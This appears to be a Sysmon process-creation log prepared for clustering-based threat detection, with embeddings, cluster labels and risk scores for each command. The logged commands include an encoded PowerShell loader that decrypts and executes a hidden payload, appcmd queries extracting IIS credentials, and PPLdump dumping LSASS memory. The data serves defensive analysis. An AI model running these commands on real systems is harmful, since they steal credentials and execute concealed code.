Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-05-27T01:28:42.711005Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA==","[ 0.03057134 -0.01075658 -0.01392496 ... -0.00258486 -0.01894072
 -0.00399027]",-1,117,Unclustered commands,0
2019-05-27T01:29:17.000311Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\InetSRV\appcmd.exe""  list vdir /text:physicalpath","[ 0.01331232  0.03156129 -0.00025676 ...  0.01300031 -0.01891458
 -0.01039331]",177,35,Commands related to querying the virtual directories in IIS (Internet Information Services) configuration.,4
2019-05-27T01:29:17.110469Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppools /text:name","[ 0.00076376  0.02050851 -0.0042306  ...  0.00037513  0.00644852
 -0.01628871]",-1,8,Unclustered commands,0
2019-05-27T01:29:17.190585Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""ERROR ( message:Configuration error "" /text:processmodel.username","[-0.00699181  0.01659888  0.00395958 ...  0.01553143  0.01336316
 -0.00415973]",79,8,Commands related to querying application pool configuration in IIS with potentially sensitive information exposure.,6
2019-05-27T01:29:17.270700Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""ERROR ( message:Configuration error "" /text:processmodel.password","[-0.00432412  0.00758594  0.00372147 ...  0.01268636  0.01667
 -0.00627849]",79,8,Commands related to querying application pool configuration in IIS with potentially sensitive information exposure.,6
2019-05-27T01:29:17.350815Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.username","[ 0.00455301  0.01778402 -0.00230585 ...  0.02185723 -0.00374182
 -0.01894385]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:17.581146Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.password","[ 0.00334278  0.01177795 -0.00328277 ...  0.01911826 -0.00059563
 -0.01856537]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:17.661261Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Filename: redirection.config"" /text:processmodel.username","[ 0.00378671  0.02245132 -0.00838032 ...  0.01271911  0.0005074
 -0.02318743]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:17.731362Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Filename: redirection.config"" /text:processmodel.password","[ 0.00398526  0.01828826 -0.01007294 ...  0.01245618  0.00362345
 -0.02568997]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:17.971708Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Line Number: 0"" /text:processmodel.username","[ 0.00056809  0.01410843 -0.0040377  ...  0.02379892 -0.00217638
 -0.00747428]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:18.041809Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Line Number: 0"" /text:processmodel.password","[ 0.00025745  0.00854054 -0.00361444 ...  0.01899699  0.0038613
 -0.00875424]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:18.282154Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Description: Cannot read configuration file due to insufficient permissions"" /text:processmodel.username","[-0.00309054  0.01621705 -0.00154444 ...  0.0048053  -0.00439987
 -0.01276096]",81,8,"Commands related to querying application pool and virtual directory configurations for sensitive credential information, typically indicative of permission issues or misconfigurations.",7
2019-05-27T01:29:18.352255Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Description: Cannot read configuration file due to insufficient permissions"" /text:processmodel.password","[-0.00362145  0.01186574 -0.00034721 ... -0.00051137 -0.00121399
 -0.01461712]",81,8,"Commands related to querying application pool and virtual directory configurations for sensitive credential information, typically indicative of permission issues or misconfigurations.",7
2019-05-27T01:29:18.662701Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool "". )"" /text:processmodel.username","[ 0.00802371  0.02844894 -0.00248065 ...  0.02298012 -0.00200938
 -0.01822942]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:18.742817Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool "". )"" /text:processmodel.password","[ 0.00428956  0.02203421 -0.00402302 ...  0.02044206  0.00489728
 -0.01877884]",80,8,This cluster contains commands that query sensitive information about application pool usernames and passwords from the IIS application configuration. The repetitive nature of commands targeting usernames and passwords raises concerns about potential credential theft or misconfiguration exploitation.,8
2019-05-27T01:29:18.822932Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:vdir.name","[ 0.01722043  0.03587711 -0.00915247 ...  0.00371155 -0.01009777
 -0.0081852 ]",177,35,Commands related to querying the virtual directories in IIS (Internet Information Services) configuration.,4
2019-05-27T01:29:18.893033Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""ERROR ( message:Configuration error "" /text:userName","[-0.00179218  0.04399054  0.00573987 ...  0.00282103  0.01082296
 -0.00450316]",157,35,"Commands related to displaying sensitive configuration information such as usernames and passwords from application directories, indicating potential exposure of sensitive data.",8
2019-05-27T01:29:18.973148Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""ERROR ( message:Configuration error "" /text:password","[-0.00996207  0.03900101  0.00412695 ...  0.0051211   0.01520958
 -0.00043281]",157,83,"Commands related to displaying sensitive configuration information such as usernames and passwords from application directories, indicating potential exposure of sensitive data.",8
2019-05-27T01:29:19.063277Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:userName","[ 0.01340586  0.04482386 -0.00216074 ...  0.01274376 -0.0081019
 -0.01124156]",82,35,This cluster contains commands that use 'appcmd.exe' to list virtual directories and extract the user names associated with them. The commands appear to be querying sensitive configuration information in a web server context.,7
2019-05-27T01:29:19.143393Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:password","[ 0.0007947   0.04069456 -0.00438519 ...  0.00923575 -0.00413461
 -0.00874174]",83,83,"Commands involving 'appcmd.exe' suggest attempts to list virtual directories and extract sensitive information like passwords, indicating potential misuse or reconnaissance activities.",7
2019-05-27T01:29:19.233522Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Filename: redirection.config"" /text:userName","[ 0.01049943  0.04337753 -0.00544016 ...  0.00901902 -0.00027848
 -0.01342432]",158,35,"Commands used to retrieve sensitive configuration details from a web server's configuration, specifically credentials for user access and redirection.",8
2019-05-27T01:29:19.323652Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Filename: redirection.config"" /text:password","[ 0.0023658   0.03943953 -0.00922947 ...  0.00626513  0.00055117
 -0.01296235]",158,83,"Commands used to retrieve sensitive configuration details from a web server's configuration, specifically credentials for user access and redirection.",8
2019-05-27T01:29:19.563997Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Line Number: 0"" /text:userName","[ 0.00477795  0.04034715 -0.00019355 ...  0.01388408 -0.00841303
  0.0003053 ]",82,35,This cluster contains commands that use 'appcmd.exe' to list virtual directories and extract the user names associated with them. The commands appear to be querying sensitive configuration information in a web server context.,7
2019-05-27T01:29:19.784314Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Line Number: 0"" /text:password","[-0.00569885  0.03362397 -0.0050166  ...  0.01128096 -0.0013782
  0.00026337]",83,83,"Commands involving 'appcmd.exe' suggest attempts to list virtual directories and extract sensitive information like passwords, indicating potential misuse or reconnaissance activities.",7
2019-05-27T01:29:20.034674Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Description: Cannot read configuration file due to insufficient permissions"" /text:userName","[ 1.36938379e-05  4.03570719e-02 -4.87324782e-04 ... -3.31173115e-03
 -6.63731154e-03 -1.21043520e-02]",81,35,"Commands related to querying application pool and virtual directory configurations for sensitive credential information, typically indicative of permission issues or misconfigurations.",7
2019-05-27T01:29:20.124804Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Description: Cannot read configuration file due to insufficient permissions"" /text:password","[-0.00480405  0.03628534 -0.0030495  ... -0.00310317 -0.00436122
 -0.00998384]",81,83,"Commands related to querying application pool and virtual directory configurations for sensitive credential information, typically indicative of permission issues or misconfigurations.",7
2019-05-27T01:29:20.435250Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir "". )"" /text:userName","[ 0.01510157  0.05691264  0.00043164 ...  0.01576367 -0.00850872
 -0.01112191]",82,35,This cluster contains commands that use 'appcmd.exe' to list virtual directories and extract the user names associated with them. The commands appear to be querying sensitive configuration information in a web server context.,7
2019-05-27T01:29:20.555423Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir "". )"" /text:password","[ 0.0010592   0.0473412  -0.0046084  ...  0.01420375 -0.00144989
 -0.00859865]",83,83,"Commands involving 'appcmd.exe' suggest attempts to list virtual directories and extract sensitive information like passwords, indicating potential misuse or reconnaissance activities.",7
2021-04-22T22:09:25.389633Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,PPLdump.exe  -v lsass lsass.dmp,"[ 0.00992869  0.03162678 -0.00487022 ...  0.01038189  0.01174848
 -0.00554654]",178,103,"Commands related to dumping and manipulating process memory, specifically targeting the LSASS process, which is critical for managing security policies and handling authentication in Windows.",9
2021-04-22T22:09:26.081337Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\services.exe 652 ""lsass.dmp"" a708b1d9-e27b-48bc-8ea7-c56d3a23f99 -v","[ 0.02857317 -0.00170997  0.00113311 ...  0.02132125  0.00021983
 -0.02359871]",209,65,"This cluster contains commands primarily related to service management and process execution in Windows, focusing on legitimate system components like services.exe and svchost.exe. The inclusion of a command referencing 'lsass.dmp' suggests potential interest in sensitive memory data, indicating a possible elevated risk scenario.",7
